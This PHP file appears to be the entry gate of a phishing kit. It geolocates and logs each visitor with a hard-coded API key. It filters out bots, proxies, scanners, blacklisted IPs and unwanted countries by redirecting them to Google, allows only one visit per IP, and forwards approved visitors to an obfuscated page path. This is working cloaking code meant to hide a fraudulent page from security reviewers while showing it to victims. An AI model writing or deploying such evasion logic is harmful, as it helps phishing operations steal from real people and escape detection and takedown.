<?php

    session_start();
    session_regenerate_id();
    error_reporting(0);

    require_once('inc/BrowserDetection.php');
    require_once('inc/functions.php');

    if( file_exists("config.db") ) {
        $config = json_decode(file_get_contents("config.db"),true);
    } else {
        header("Location: install.php");
        exit();
    }

    function get_lang() {
        $lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
        $acceptLang = ['en','es','fr','it','de','gr', 'dk','il','pt']; 
        $lang = in_array($lang, $acceptLang) ? $lang : 'en';
        $_SESSION['lang'] = $lang;
        return $lang;
    }

    $one_time_access          = ( $config['one_time_access'] ) ? $config['one_time_access'] : '';
    $conf_hcaptcha            = ( $config['hcaptcha'] ) ? $config['hcaptcha'] : '';
    $conf_hcaptcha_secret_key = ( $config['hcaptcha_secret_key'] ) ? $config['hcaptcha_secret_key'] : '';
    $conf_hcaptcha_site_key   = ( $config['hcaptcha_site_key'] ) ? $config['hcaptcha_site_key'] : '';
    $conf_antibot             = ( $config['antibot'] ) ? $config['antibot'] : '';
    $conf_botblockerkey        = ( $config['botblockerkey'] ) ? $config['botblockerkey'] : '';
    $conf_device              = ( $config['device'] ) ? $config['device'] : '';
    $conf_redirect_bot        = ( $config['redirect_bots'] ) ? $config['redirect_bots'] : 'https://www.google.com/';
    $conf_allowed_countries   = ( $config['allowed_countries'] ) ? explode(',',$config['allowed_countries']) : [];
    $whitelist = ( is_array(json_decode($config['whitelist'],true)) ) ? json_decode($config['whitelist'],true) : '';
    $blacklist = ( is_array(json_decode($config['blacklist'],true)) ) ? json_decode($config['blacklist'],true) : '';
    $useragent = ( is_array(json_decode($config['useragent'],true)) ) ? json_decode($config['useragent'],true) : '';

    function get_ip_info_curl($ip) {
        $url = "https://pro.ip-api.com/php/{$ip}?key=UO8wl6MQD2zPxmf&fields=status,message,country,countryCode,timezone,currency,isp,mobile,proxy,hosting,query";

        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        
        $response = curl_exec($ch);
        curl_close($ch);

        if ($response !== false) {
            return unserialize($response);
        } else {
            return ['status' => 'fail', 'message' => 'cURL request failed'];
        }
    }
    $ip_infos = get_ip_info_curl(get_client_ip());

    $_SESSION['currency'] = $ip_infos['currency'];
    $_SESSION['country'] = $ip_infos['country'];

    if( allow_device($conf_device) == true ) {
        visitors($ip_infos,"Blocked by device");
        header("Location:" . $conf_redirect_bot);
        exit();
    }

    if( ip_filter($whitelist) ) {
        $_SESSION['last_page'] = "msg";
        $_SESSION['user_allowed'] = true;
        visitors($ip_infos,"Whitelist");
        get_lang();
        header("Location: DUVzTTavlOw/?redirection=msg");
        exit();
    }

    if( ip_filter($blacklist) ) {
        visitors($ip_infos,"Blacklisted");
        header("Location:" . $conf_redirect_bot);
        exit();
    }

    if( block_user_agent($useragent) ) {
        visitors($ip_infos,"User Agent Blocked");
        header("Location:" . $conf_redirect_bot);
        exit();
    }

    if( $one_time_access == "on" && one_time_access() ) {
        session_destroy();
        visitors($ip_infos,"Blocked O-T-A");
        header("HTTP/1.1 403 Forbidden");
        die("Your IP address is not allowed to access this page.<br>You can only access the site once.");
    }

    if( $conf_hcaptcha == 1 ) {
        include('verifying.php');
        exit();
    }

    if( $conf_antibot == 1 ) {
        include('army.php');
        exit();
    }

    if( count($conf_allowed_countries) > 0 ) {
        if( !in_array($ip_infos['countryCode'],$conf_allowed_countries) ) {
            visitors($ip_infos,"Country not allowed");
            header("Location:" . $conf_redirect_bot);
            exit();
        }
    }

    if( $ip_infos['status'] == "success" ) {

        if( $ip_infos['proxy'] == true ) {
            visitors($ip_infos,"Detected as bot");
            header("Location:" . $conf_redirect_bot);
            exit();
        }

        $_SESSION['last_page'] = "msg";
        $_SESSION['user_allowed'] = true;
        visitors($ip_infos,"Allowed");
        get_lang();
        header("Location: DUVzTTavlOw/?redirection=msg");
        exit();

    } else {
        if( get_client_ip() == "127.0.0.1" ) {
            $_SESSION['last_page'] = "msg";
            $_SESSION['user_allowed'] = true;
            visitors($ip_infos,"Localhost");
            get_lang();
            header("Location: DUVzTTavlOw/?redirection=msg");
            exit();
        }
        visitors($ip_infos,"Not Allowed");
        header("Location:" . $conf_redirect_bot);
        exit();
    }

?>